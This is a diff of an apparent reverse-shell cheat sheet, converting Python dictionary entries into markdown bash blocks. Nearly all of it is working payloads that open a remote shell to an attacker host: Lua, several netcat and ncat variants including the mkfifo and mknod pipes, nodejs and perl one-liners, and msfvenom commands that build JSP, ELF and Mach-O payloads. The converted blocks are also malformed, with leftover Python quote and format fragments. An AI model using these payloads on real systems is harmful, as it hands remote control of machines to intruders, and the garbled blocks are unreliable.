@@ -40,13 +40,41 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw > revshell.jsp' 
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f elf > revshell' % (ipaddr, port),
 ```
 
-'lua':'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'' % (ipaddr, port),
-        'nc':'nc -e /bin/sh %s %d' % (ipaddr, port),
-        'nc-c':'nc -c /bin/sh %s %d' % (ipaddr, port),
-        'nc-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
-        'nc-mknod':'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
-        'nc-pipe':'/bin/sh | nc %s %d' % (ipaddr, port),
-        'ncat':'ncat %s %d -e /bin/sh' % (ipaddr, port),
+```bash
+# Lua
+lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'' % (ipaddr, port),
+```
+
+```bash
+# Netcat 
+nc -e /bin/sh %s %d' % (ipaddr, port),
+```
+
+```bash
+# Netcat -c
+nc -c /bin/sh %s %d' % (ipaddr, port),
+```
+
+```bash
+# Netcat mkfifo
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
+```       
+
+```bash
+# Netcat mknod
+rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
+```
+
+```bash
+# Netcat pipe
+/bin/sh | nc %s %d' % (ipaddr, port),
+```       
+       
+```bash
+# Ncat
+ncat %s %d -e /bin/sh' % (ipaddr, port),
+```
+
         'nodejs':'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%d,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();' % (port, ipaddr),
         'osx-bin':'msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f macho > revshell.macho' % (ipaddr, port),
         'perl':'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (ipaddr, port),
